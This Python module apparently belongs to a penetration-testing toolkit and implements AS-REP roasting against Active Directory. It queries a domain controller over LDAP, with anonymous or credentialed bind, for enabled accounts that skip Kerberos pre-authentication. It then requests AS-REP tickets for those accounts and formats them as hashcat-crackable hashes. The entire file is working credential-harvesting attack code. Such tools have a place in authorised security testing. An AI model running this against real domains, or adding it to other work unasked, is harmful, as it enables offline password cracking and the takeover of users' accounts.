"""
ASREP Roasting — discover accounts with DONT_REQUIRE_PREAUTH and request
AS-REP tickets that can be cracked offline (hashcat/JtR format).

Uses impacket's LDAP to discover vulnerable accounts and Kerberos to
request AS-REP tickets without pre-authentication.
"""

import logging
import random as _random
from binascii import hexlify
from datetime import datetime, timezone, timedelta
from typing import Any

from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue

from impacket.examples import logger as impacket_logger
from impacket.krb5.asn1 import AS_REP, AS_REQ, KRB_ERROR, KERB_PA_PAC_REQUEST, \
    ETYPE_INFO2, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.ldap import ldap, ldapasn1
from impacket.examples.utils import ldap_login

# Random number generator for AS-REQ nonces
_rand = _random.SystemRandom()

# Suppress impacket's noisy logging
logging.getLogger("impacket").setLevel(logging.ERROR)
impacket_logger.init(ts=False, debug=False)


def _make_search_base(domain: str) -> str:
    """Convert ``example.local`` → ``DC=example,DC=local``."""
    return "DC=" + ",DC=".join(domain.split("."))


def _format_asrep_hash(
    decoded_asrep: Any,
    username: str,
    domain: str,
    output_format: str,
) -> str | None:
    """Format an AS-REP ticket as a hashcat-mode crackable hash string.

    Supports:
      - RC4-HMAC  (etype 23)  → ``$krb5asrep$23$user@domain:cipher$``
      - AES128    (etype 17)  → ``$krb5asrep$17$user@domain:salt$checksum$edata``
      - AES256    (etype 18)  → ``$krb5asrep$18$user@domain:salt$checksum$edata``

    Salt is extracted from PA-ETYPE-INFO2 padata when present; falls back to
    empty string for RC4 (which does not require salt).
    """
    etype = int(decoded_asrep["enc-part"]["etype"])
    cipher = decoded_asrep["enc-part"]["cipher"].asOctets()

    # Try to extract salt from PA-DATA (etype-info2) — needed for AES modes
    salt = b""
    try:
        for pa in decoded_asrep["padata"]:
            padata_type = int(pa["padata-type"])
            if padata_type == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                etype_info2 = decoder.decode(
                    pa["padata-value"],
                    asn1Spec=ETYPE_INFO2(),
                )
                for entry in etype_info2:
                    try:
                        if entry["salt"].hasValue():
                            salt = entry["salt"].asOctets()
                            break
                    except (AttributeError, KeyError):
                        continue
                break
    except Exception:
        pass

    if etype == constants.EncryptionTypes.rc4_hmac.value:
        # Hashcat mode 18200: $krb5asrep$23$user@domain:cipher$
        entry = (
            f"$krb5asrep${etype}${username}@{domain}:"
            f"{hexlify(cipher[:16]).decode()}${hexlify(cipher[16:]).decode()}"
        )
    elif etype in (
        constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value,
        constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value,
    ):
        # Hashcat mode 19600: $krb5asrep$etype$user@domain:salt$checksum$edata
        salt_str = salt.decode("utf-8", errors="replace") if salt else ""
        checksum = hexlify(cipher[-12:]).decode()
        edata = hexlify(cipher[:-12]).decode()
        entry = (
            f"$krb5asrep${etype}${username}@{domain}:{salt_str}"
            f"${checksum}${edata}"
        )
    else:
        logging.debug(
            "Skipping %s — unsupported e-type %d", username, etype
        )
        return None

    return entry


def _request_asrep(
    username: str,
    domain: str,
    dc_ip: str,
) -> dict | None:
    """Request an AS-REP for a user that may not require pre-authentication.

    Sends an AS-REQ *without* PA-ENC-TIMESTAMP. If the KDC returns an
    AS-REP (rather than KDC_ERR_PREAUTH_REQUIRED), the user is vulnerable
    and we return the decoded response.

    Returns ``None`` if the user requires pre-authentication.
    """
    domain_upper = domain.upper()

    client_name = Principal(
        username,
        type=constants.PrincipalNameType.NT_PRINCIPAL.value,
    )
    server_name = Principal(
        f"krbtgt/{domain_upper}",
        type=constants.PrincipalNameType.NT_PRINCIPAL.value,
    )

    # Build PA-PAC-REQUEST
    pac_request_type = constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
    kerb_pa = KERB_PA_PAC_REQUEST()
    kerb_pa["include-pac"] = True
    encoded_pac = encoder.encode(kerb_pa)

    # Build initial AS-REQ (without encrypted timestamp) — the whole point of
    # ASREP roasting is sending this *without* PA-ENC-TIMESTAMP so the KDC
    # returns the AS-REP directly for users with UF_DONT_REQUIRE_PREAUTH.
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

    as_req["padata"] = noValue
    as_req["padata"][0] = noValue
    as_req["padata"][0]["padata-type"] = pac_request_type
    as_req["padata"][0]["padata-value"] = encoded_pac

    req_body = seq_set(as_req, "req-body")

    opts = [
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.proxiable.value,
    ]
    req_body["kdc-options"] = constants.encodeFlags(opts)

    seq_set(req_body, "sname", server_name.components_to_asn1)
    seq_set(req_body, "cname", client_name.components_to_asn1)
    req_body["realm"] = domain_upper

    now = datetime.now(timezone.utc) + timedelta(days=1)
    req_body["till"] = KerberosTime.to_asn1(now)
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = _rand.getrandbits(31)

    # Request both AES and RC4 etypes so we get whichever the KDC prefers
    supported_etypes = (
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.rc4_hmac.value),
    )
    seq_set_iter(req_body, "etype", supported_etypes)

    message = encoder.encode(as_req)

    try:
        r = sendReceive(message, domain, dc_ip)
    except Exception as exc:
        error_str = str(exc)
        if "KDC_ERR_PREAUTH_REQUIRED" in error_str:
            # User requires pre-authentication — not vulnerable
            return None
        # Some other Kerberos error
        logging.debug("AS-REQ failed for %s: %s", username, error_str)
        return None

    # Try to decode as AS-REP
    try:
        decoded = decoder.decode(r, asn1Spec=AS_REP())[0]
    except Exception:
        # Not an AS-REP (maybe KRB_ERROR we missed)
        try:
            _ = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except Exception:
            pass
        return None

    return {
        "decoded": decoded,
        "etypes": [int(decoded["enc-part"]["etype"])],
        "cipher": decoded["enc-part"]["cipher"].asOctets(),
    }


async def ad_asrep_roast(
    domain: str,
    dc_ip: str,
    username: str = "",
    password: str = "",
    output_format: str = "hashcat",
) -> dict:
    """Discover accounts with DONT_REQUIRE_PREAUTH and request AS-REP hashes.

    Connects to the target domain controller via LDAP to discover user
    accounts that have the ``UF_DONT_REQUIRE_PREAUTH`` flag set, then
    requests AS-REP tickets for each vulnerable account so they can be
    cracked offline.

    Args:
        domain:        AD domain FQDN (e.g. ``"example.local"``).
        dc_ip:         IP address of a domain controller.
        username:      Optional bind username (empty = anonymous).
        password:      Optional password.
        output_format: Hash format — only ``"hashcat"`` is supported.

    Returns:
        A dict with:
        - ``domain`` / ``dc_ip`` — metadata
        - ``authenticated`` — whether credentials were provided
        - ``hashes`` — list of ``{"hash": …, "format": …, "source": "asrep_roast",
          "username": …, "etype": …}``
        - ``accounts`` — list of discovered vulnerable account summaries
        - ``count`` — total number of hashes returned
        - ``error`` — error message or ``None``
    """
    if output_format not in ("hashcat",):
        raise ValueError(
            f"Unsupported output_format: '{output_format}'. "
            "Only 'hashcat' is supported."
        )

    ldap_conn = None
    result: dict[str, Any] = {
        "domain": domain,
        "dc_ip": dc_ip,
        "authenticated": bool(username and password),
        "hashes": [],
        "accounts": [],
        "count": 0,
        "error": None,
    }

    try:
        # ------------------------------------------------------------------
        # 1. LDAP search — find users with DONT_REQUIRE_PREAUTH
        # ------------------------------------------------------------------
        base_dn = _make_search_base(domain)

        ldap_conn = ldap_login(
            None,
            base_dn,
            dc_ip,
            None,
            False,  # do_kerberos
            username or f"anonymous@{domain}",
            password,
            domain,
            "",  # lmhash
            "",  # nthash
            "",  # aesKey
        )

        # LDAP filter:
        #   - objectCategory=person
        #   - NOT disabled (!(userAccountControl:1.2.840.113556.1.4.803:=2))
        #   - UF_DONT_REQUIRE_PREAUTH (userAccountControl:1.2.840.113556.1.4.803:=4194304)
        search_filter = (
            "(&"
            "(objectCategory=person)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"
            ")"
        )
        paged_control = ldapasn1.SimplePagedResultsControl(
            criticality=True, size=1000
        )

        try:
            resp = ldap_conn.search(
                searchFilter=search_filter,
                attributes=[
                    "sAMAccountName",
                    "pwdLastSet",
                    "memberOf",
                    "userAccountControl",
                    "lastLogon",
                    "mail",
                    "displayName",
                ],
                searchControls=[paged_control],
            )
        except ldap.LDAPSearchError as e:
            if "sizeLimitExceeded" in str(e):
                resp = e.getAnswers()
            else:
                raise

        # ------------------------------------------------------------------
        # 2. Process LDAP results
        # ------------------------------------------------------------------
        accounts: list[dict[str, Any]] = []
        vulnerable_users: list[str] = []

        for item in resp:
            if not isinstance(item, ldapasn1.SearchResultEntry):
                continue

            sam_name = ""
            pwd_last_set = ""
            member_of: list[str] = []
            last_logon = "N/A"
            uac = 0
            mail = ""
            display_name = ""

            for attr in item["attributes"]:
                attr_type = str(attr["type"])
                if attr_type == "sAMAccountName":
                    sam_name = str(attr["vals"][0])
                elif attr_type == "pwdLastSet":
                    raw = str(attr["vals"][0])
                    pwd_last_set = "<never>" if raw == "0" else raw
                elif attr_type == "memberOf":
                    member_of = [str(v) for v in attr["vals"]]
                elif attr_type == "lastLogon":
                    raw = str(attr["vals"][0])
                    last_logon = "<never>" if raw == "0" else raw
                elif attr_type == "userAccountControl":
                    uac = int(str(attr["vals"][0]))
                elif attr_type == "mail":
                    mail = str(attr["vals"][0]) if attr["vals"] else ""
                elif attr_type == "displayName":
                    display_name = str(attr["vals"][0]) if attr["vals"] else ""

            if not sam_name:
                continue

            # Double-check: skip disabled accounts
            if uac & 0x0002:  # UF_ACCOUNTDISABLE
                continue

            accounts.append({
                "sam_account_name": sam_name,
                "pwd_last_set": pwd_last_set,
                "dont_require_preauth": bool(uac & 0x400000),  # UF_DONT_REQUIRE_PREAUTH
                "member_of": member_of,
                "last_logon": last_logon,
                "mail": mail,
                "display_name": display_name,
            })

            vulnerable_users.append(sam_name)

        result["accounts"] = accounts

        if not accounts:
            return result

        # ------------------------------------------------------------------
        # 3. Request AS-REP for each vulnerable user
        # ------------------------------------------------------------------
        for sam_name in vulnerable_users:
            asrep_data = _request_asrep(sam_name, domain, dc_ip)
            if asrep_data is None:
                logging.debug(
                    "AS-REP request failed for %s (requires preauth or error)",
                    sam_name,
                )
                continue

            decoded = asrep_data["decoded"]

            hash_entry = _format_asrep_hash(
                decoded, sam_name, domain, output_format,
            )

            if hash_entry:
                etype_val = int(decoded["enc-part"]["etype"])
                etype_name = {
                    23: "RC4-HMAC",
                    17: "AES128-CTS-HMAC-SHA1-96",
                    18: "AES256-CTS-HMAC-SHA1-96",
                }.get(etype_val, f"etype-{etype_val}")

                result["hashes"].append({
                    "hash": hash_entry,
                    "format": output_format,
                    "source": "asrep_roast",
                    "username": sam_name,
                    "etype": etype_name,
                })

        result["count"] = len(result["hashes"])

    except Exception as exc:
        result["error"] = str(exc)
    finally:
        if ldap_conn is not None:
            try:
                ldap_conn.close()
            except Exception:
                pass

    return result
